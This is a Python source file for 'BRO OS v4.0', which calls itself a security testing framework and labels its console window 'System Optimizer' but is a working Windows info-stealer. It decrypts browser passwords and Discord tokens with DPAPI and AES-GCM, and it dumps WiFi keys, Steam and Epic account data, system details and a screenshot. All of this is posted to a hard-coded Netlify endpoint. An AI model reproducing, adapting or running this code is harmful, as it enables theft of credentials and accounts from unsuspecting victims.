#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════╗
║           BRO OS v4.0 - DYNAMIC EDITION              ║
║        Advanced Security Testing Framework           ║
║           All Rights Reserved © Bro                  ║
╚═══════════════════════════════════════════════════════╝
"""

import os, sys, re, json, base64, time, random, socket, platform
import shutil, sqlite3, subprocess, threading, ctypes, tempfile
import struct, zlib, urllib.request
from datetime import datetime
from pathlib import Path
from urllib.request import urlopen, Request

# ====== AUTO INSTALL ======
def auto_install(pkg_name, import_name=None):
    if import_name is None:
        import_name = pkg_name.replace('-','_').split('[')[0]
    try:
        __import__(import_name)
        return True
    except:
        pass
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg_name, "-q"],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

for pkg in ['requests', 'pycryptodome', 'pywin32', 'Pillow', 'pyautogui', 'psutil']:
    auto_install(pkg)

import requests
import pyautogui
import psutil
from PIL import ImageGrab

try:
    from Crypto.Cipher import AES
except:
    try:
        from Cryptodome.Cipher import AES
    except:
        AES_AVAILABLE = False
    else:
        AES_AVAILABLE = True
else:
    AES_AVAILABLE = True

try:
    import win32crypt
    from win32crypt import CryptUnprotectData
    WIN32CRYPT_AVAILABLE = True
except:
    WIN32CRYPT_AVAILABLE = False

# ====== CONFIG ======
VERSION = "4.0"
AUTHOR = "Bro"

# ====== 🔥 الرابط الجديد لـ Netlify Functions ======
API_URL = "https://sparkly-custard-d27e0d.netlify.app/.netlify/functions/submit"
SERVER_URL = "https://sparkly-custard-d27e0d.netlify.app"

CONFIG_DIR = os.path.join(os.environ.get('APPDATA','.'), 'BroOS')

# ====== DATA SENDER ======
def send_to_server(data):
    try:
        response = requests.post(API_URL, json=data, timeout=15)
        if response.status_code == 200:
            print("[✓] Data sent successfully!")
            return True
        else:
            print(f"[✗] Server returned: {response.status_code}")
            try:
                print(f"  Response: {response.text}")
            except:
                pass
            return False
    except requests.exceptions.ConnectionError:
        print("[✗] Cannot connect to server! Make sure server is running.")
        print("[!] Check: " + API_URL)
        return False
    except Exception as e:
        print(f"[✗] Error: {e}")
        return False

# ====== UTILITIES ======
def clear():
    os.system('cls' if os.name=='nt' else 'clear')

def set_title(t):
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("Bro OS v" + VERSION + " | " + t)
    except:
        pass

def status(msg):
    print("[*] " + msg)

def loading(text, dur=0.5):
    print(text + "...")
    time.sleep(dur)

def wait():
    input("\nPress Enter to continue...")

def banner():
    clear()
    set_title("Bro OS v" + VERSION + " | Bro Edition")
    print("\n" + "="*60)
    print("  BRO OS v" + VERSION + " - DYNAMIC EDITION")
    print("  Advanced Security Testing Framework")
    print("  All Rights Reserved (c) Bro")
    print("="*60 + "\n")

# ====== FULL PAYLOAD ======
class FullPayload:
    def __init__(self):
        self.results = {}
        self.temp_db = os.path.join(tempfile.gettempdir(), 'bro_login_data.db')
        self.roaming = os.environ.get('APPDATA', '')
        self.local_appdata = os.environ.get('LOCALAPPDATA', '')
        self.userprofile = os.environ.get('USERPROFILE', '')
    
    def _get_master_key(self, discord_path):
        local_state_path = os.path.join(discord_path, "Local State")
        if not os.path.exists(local_state_path):
            return None
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
                return None
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            master_key = encrypted_key[5:]
            if WIN32CRYPT_AVAILABLE:
                master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
            return None
        except:
            return None
    
    def _decrypt_token_aes(self, encrypted_data, master_key):
        try:
            iv = encrypted_data[3:15]
            payload = encrypted_data[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted[:-16].decode('utf-8', errors='ignore')
        except:
            return None
    
    def extract_tokens(self):
        tokens = set()
        
        discord_paths = {
            "Discord": os.path.join(self.roaming, "Discord"),
            "Discord Canary": os.path.join(self.roaming, "discordcanary"),
            "Discord PTB": os.path.join(self.roaming, "discordptb"),
            "Discord Development": os.path.join(self.roaming, "discorddevelopment"),
            "Discord (Local)": os.path.join(self.local_appdata, "Discord"),
        }
        
        for app_name, app_path in discord_paths.items():
            if not os.path.isdir(app_path):
                continue
            
            master_key = None
            if AES_AVAILABLE and WIN32CRYPT_AVAILABLE:
                master_key = self._get_master_key(app_path)
            
            ldb_path = os.path.join(app_path, "Local Storage", "leveldb")
            if not os.path.isdir(ldb_path):
                continue
            
            for file_name in os.listdir(ldb_path):
                if not file_name.endswith(('.ldb', '.log')):
                    continue
                
                file_path = os.path.join(ldb_path, file_name)
                try:
                    with open(file_path, 'rb') as f:
                        content = f.read()
                    
                    text = content.decode('utf-8', errors='ignore')
                    
                    patterns = [
                        r'[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}',
                        r'mfa\.[A-Za-z0-9_-]{84}',
                    ]
                    for pattern in patterns:
                        found = re.findall(pattern, text)
                        for t in found:
                            tokens.add(t)
                    
                    if master_key:
                        enc_pattern = r'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)'
                        found_enc = re.findall(enc_pattern, text)
                        for b64_data in found_enc:
                            try:
                                enc_bytes = base64.b64decode(b64_data)
                                token = self._decrypt_token_aes(enc_bytes, master_key)
                                if token and token.count('.') == 2:
                                    tokens.add(token)
                            except:
                                pass
                    
                    for pattern in [rb'mfa\.[A-Za-z0-9_-]{84}', rb'[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}']:
                        raw_matches = re.findall(pattern, content)
                        for match in raw_matches:
                            try:
                                token = match.decode('utf-8', errors='ignore')
                                if token.count('.') >= 2 or token.startswith('mfa.'):
                                    tokens.add(token)
                            except:
                                pass
                                
                except:
                    continue
        
        validated = []
        for t in tokens:
            try:
                r = requests.get(
                    'https://discord.com/api/v9/users/@me',
                    headers={
                        'Authorization': t,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    },
                    timeout=5
                )
                if r.status_code == 200:
                    data = r.json()
                    validated.append({
                        'valid': True,
                        'username': data.get('username', '?'),
                        'discriminator': data.get('discriminator', '0000'),
                        'email': data.get('email', 'No email'),
                        'phone': data.get('phone', 'No phone'),
                        'mfa': data.get('mfa_enabled', False),
                        'nitro': {0: 'None', 1: 'Classic', 2: 'Booster'}.get(data.get('premium_type', 0), '?'),
                        'verified': data.get('verified', False),
                        'token': t
                    })
                elif r.status_code == 403:
                    validated.append({'valid': 'partial', 'token': t[:50] + '...', 'error': '403 Forbidden'})
                else:
                    validated.append({'valid': False, 'token': t[:40] + '...', 'error': str(r.status_code)})
            except:
                validated.append({'valid': False, 'token': t[:40] + '...', 'error': 'Connection error'})
        
        return validated
    
    def extract_steam(self):
        steam_accounts = []
        
        steam_paths = [
            os.path.join('C:', 'Program Files (x86)', 'Steam', 'config', 'loginusers.vdf'),
            os.path.join('C:', 'Program Files', 'Steam', 'config', 'loginusers.vdf'),
            os.path.join(self.program_files_x86(), 'Steam', 'config', 'loginusers.vdf'),
            os.path.join(self.program_files(), 'Steam', 'config', 'loginusers.vdf'),
        ]
        
        for sp in steam_paths:
            sp = os.path.normpath(sp)
            if os.path.exists(sp):
                try:
                    with open(sp, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    
                    accounts = re.findall(r'"(\d+)"\s*\{([^}]+)\}', content)
                    for sid, data in accounts:
                        name = re.search(r'"PersonaName"\s*"([^"]+)"', data)
                        steam_login = re.search(r'"AccountName"\s*"([^"]+)"', data)
                        
                        s_name = name.group(1) if name else 'Unknown'
                        s_login = steam_login.group(1) if steam_login else s_name
                        
                        steam_accounts.append({
                            'platform': 'Steam',
                            'username': s_name,
                            'login': s_login,
                            'steamid': sid,
                            'profile': 'https://steamcommunity.com/profiles/' + sid
                        })
                except:
                    pass
        
        return steam_accounts
    
    def program_files_x86(self):
        pf = os.environ.get('ProgramFiles(x86)')
        if pf:
            return pf
        return os.path.join('C:', 'Program Files (x86)')
    
    def program_files(self):
        pf = os.environ.get('ProgramFiles')
        if pf:
            return pf
        return os.path.join('C:', 'Program Files')
    
    def extract_epic(self):
        epic_accounts = []
        
        epic_paths = [
            os.path.join(self.local_appdata, 'EpicGamesLauncher', 'Saved', 'Config', 'Windows'),
            os.path.join(self.local_appdata, 'UnrealEngineLauncher', 'Saved', 'Config', 'Windows'),
        ]
        
        for ep in epic_paths:
            if os.path.exists(ep):
                try:
                    for fn in os.listdir(ep):
                        if fn.endswith('.ini') or fn.endswith('.cfg'):
                            fp = os.path.join(ep, fn)
                            try:
                                with open(fp, 'r', encoding='utf-16', errors='ignore') as f:
                                    content = f.read()
                                emails = re.findall(r'(?:email|account_id|display_name|AccountDisplayName|LastLoggedInDisplayName)\s*[=:]\s*"?([a-zA-Z0-9_.@\-]+)"?', content, re.IGNORECASE)
                                if emails:
                                    epic_accounts.append({
                                        'platform': 'Epic Games',
                                        'data': emails[:5]
                                    })
                            except:
                                pass
                except:
                    pass
        
        return epic_accounts
    
    def extract_gaming_accounts(self):
        all_gaming = []
        steam = self.extract_steam()
        all_gaming.extend(steam)
        epic = self.extract_epic()
        all_gaming.extend(epic)
        return all_gaming
    
    def extract_passwords(self):
        browsers = [
            ('Chrome', os.path.join(self.local_appdata, 'Google', 'Chrome', 'User Data')),
            ('Edge', os.path.join(self.local_appdata, 'Microsoft', 'Edge', 'User Data')),
            ('Brave', os.path.join(self.local_appdata, 'BraveSoftware', 'Brave-Browser', 'User Data')),
        ]
        
        passwords = []
        
        for name, profile_path in browsers:
            login_db = os.path.join(profile_path, 'Default', 'Login Data')
            local_state = os.path.join(profile_path, 'Local State')
            
            if not os.path.exists(login_db):
                login_db = os.path.join(profile_path, 'Profile 1', 'Login Data')
                if not os.path.exists(login_db):
                    continue
            
            key = None
            if os.path.exists(local_state) and WIN32CRYPT_AVAILABLE:
                try:
                    with open(local_state, 'r', encoding='utf-8') as f:
                        ls = json.load(f)
                    if 'os_crypt' in ls and 'encrypted_key' in ls['os_crypt']:
                        encrypted_key = base64.b64decode(ls['os_crypt']['encrypted_key'])
                        encrypted_key = encrypted_key[5:]
                        key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                except:
                    pass
            
            try:
                shutil.copy2(login_db, self.temp_db)
                conn = sqlite3.connect(self.temp_db)
                cur = conn.cursor()
                cur.execute('SELECT origin_url, username_value, password_value FROM logins')
                
                for url, user, pwd_enc in cur.fetchall():
                    if not url or not user:
                        continue
                    pwd = ''
                    try:
                        if key and AES_AVAILABLE and len(pwd_enc) > 15:
                            nonce = pwd_enc[3:15]
                            ciphertext = pwd_enc[15:-16]
                            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                            pwd = cipher.decrypt(ciphertext).decode('utf-8', errors='ignore')
                        elif WIN32CRYPT_AVAILABLE:
                            pwd = CryptUnprotectData(pwd_enc, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                        else:
                            pwd = '[no decryption]'
                    except:
                        pwd = '[decrypt failed]'
                    
                    passwords.append({
                        'browser': name,
                        'url': url,
                        'username': user,
                        'password': pwd
                    })
                
                conn.close()
                try:
                    os.remove(self.temp_db)
                except:
                    pass
            except:
                pass
        
        return passwords
    
    def extract_wifi(self):
        wifi = []
        try:
            data = subprocess.check_output(
                'netsh wlan show profiles',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore')
            
            profiles = re.findall(r'All User Profile\s+:\s+(.+)', data)
            for profile in profiles:
                try:
                    pd = subprocess.check_output(
                        'netsh wlan show profile "' + profile + '" key=clear',
                        shell=True,
                        stderr=subprocess.DEVNULL
                    ).decode('utf-8', errors='ignore')
                    
                    match = re.search(r'Key Content\s+:\s+(.+)', pd)
                    pwd = match.group(1) if match else 'Open network'
                    wifi.append({
                        'ssid': profile,
                        'password': pwd,
                        'secure': 'Yes' if match else 'No'
                    })
                except:
                    wifi.append({
                        'ssid': profile,
                        'password': 'Error reading',
                        'secure': 'Unknown'
                    })
        except:
            pass
        
        return wifi
    
    def extract_info(self):
        info = {}
        info['hostname'] = socket.gethostname()
        info['username'] = os.environ.get('USERNAME', 'Unknown')
        info['os'] = platform.platform()
        info['arch'] = platform.machine()
        info['date'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        try:
            info['cpu'] = platform.processor() or platform.machine()
            info['cpu_usage'] = str(psutil.cpu_percent()) + '%'
            info['ram'] = str(psutil.virtual_memory().total // (1024**3)) + ' GB'
            info['ram_usage'] = str(psutil.virtual_memory().percent) + '%'
        except:
            pass
        
        try:
            req = Request('https://api.ipify.org')
            info['public_ip'] = urlopen(req, timeout=3).read().decode().strip()
        except:
            info['public_ip'] = socket.gethostbyname(socket.gethostname())
        
        try:
            info['processes'] = str(len(psutil.pids()))
        except:
            pass
        
        return info
    
    def screenshot(self):
        try:
            img = ImageGrab.grab(all_screens=True)
            sp = os.path.join(tempfile.gettempdir(), 'bro_sc_' + str(int(time.time())) + '.png')
            img.save(sp)
            return sp
        except:
            try:
                img = pyautogui.screenshot()
                sp = os.path.join(tempfile.gettempdir(), 'bro_sc_' + str(int(time.time())) + '.png')
                img.save(sp)
                return sp
            except:
                return None
    
    def send_all_data(self):
        print("\n" + "="*60)
        print("  BRO OS v" + VERSION + " - DATA EXTRACTION")
        print("="*60 + "\n")
        
        all_data = {
            'computer': {},
            'discord_tokens': [],
            'gaming_accounts': [],
            'passwords': [],
            'wifi': [],
            'timestamp': datetime.now().isoformat()
        }
        
        status("Gathering system info...")
        info = self.extract_info()
        all_data['computer'] = info
        print("  [+] Hostname: " + info.get('hostname', '?'))
        print("  [+] Username: " + info.get('username', '?'))
        print("  [+] IP: " + info.get('public_ip', '?'))
        
        status("Scanning for Discord tokens...")
        tokens = self.extract_tokens()
        if tokens:
            valid_count = sum(1 for t in tokens if t.get('valid') == True)
            all_data['discord_tokens'] = tokens
            print("  [+] Found " + str(len(tokens)) + " tokens (" + str(valid_count) + " valid)")
        
        status("Extracting gaming accounts...")
        gaming = self.extract_gaming_accounts()
        if gaming:
            all_data['gaming_accounts'] = gaming
            print("  [+] Found " + str(len(gaming)) + " gaming accounts")
        
        status("Decrypting browser passwords...")
        passwords = self.extract_passwords()
        if passwords:
            all_data['passwords'] = passwords[:50]
            print("  [+] Found " + str(len(passwords)) + " passwords")
        
        status("Dumping WiFi networks...")
        wifi = self.extract_wifi()
        if wifi:
            all_data['wifi'] = wifi
            print("  [+] Found " + str(len(wifi)) + " networks")
        
        status("Capturing screenshot...")
        sc = self.screenshot()
        if sc:
            try:
                with open(sc, 'rb') as f:
                    sc_base64 = base64.b64encode(f.read()).decode('utf-8')
                    all_data['screenshot'] = sc_base64
                    all_data['screenshot_name'] = os.path.basename(sc)
                os.remove(sc)
                print("  [+] Screenshot captured")
            except:
                pass
        
        # ====== حفظ البيانات محلياً ======
        try:
            json_path = os.path.join(os.getcwd(), 'data_output.json')
            with open(json_path, 'w', encoding='utf-8') as f:
                json.dump(all_data, f, indent=2, ensure_ascii=False)
            print("  [+] Data saved locally to: " + json_path)
        except:
            pass
        
        print("\n" + "="*60)
        status("Sending data to Netlify...")
        print("  [+] URL: " + API_URL)
        
        success = send_to_server(all_data)
        
        if success:
            print("\n  " + "="*50)
            print("  ✅ ALL DATA SENT SUCCESSFULLY!")
            print("  ="*50)
            print("  📊 Check the dashboard: " + SERVER_URL)
        else:
            print("\n  " + "="*50)
            print("  ⚠️ FAILED TO SEND DATA TO SERVER!")
            print("  " + "="*50)
            print("  [!] Make sure the Netlify site is deployed with Functions")
            print("\n  💾 Data saved locally in: data_output.json")
        
        print("\n" + "="*60)
        print("  EXTRACTION COMPLETE")
        print("  All Rights Reserved (c) Bro")
        print("="*60 + "\n")
        
        return success

# ====== MAIN ======
if __name__ == '__main__':
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("Bro OS v" + VERSION + " | System Optimizer")
    except:
        pass
    
    try:
        payload = FullPayload()
        payload.send_all_data()
        
        print("\n" + "="*60)
        print("  Press Enter to exit...")
        input()
        
    except KeyboardInterrupt:
        clear()
        print("\n" + "="*60)
        print("  BRO OS - Shutting down...")
        print("="*60)
        sys.exit(0)
    except Exception as e:
        clear()
        print("\n" + "="*60)
        print("  ❌ Error: " + str(e))
        print("="*60)
        wait()
        sys.exit(1)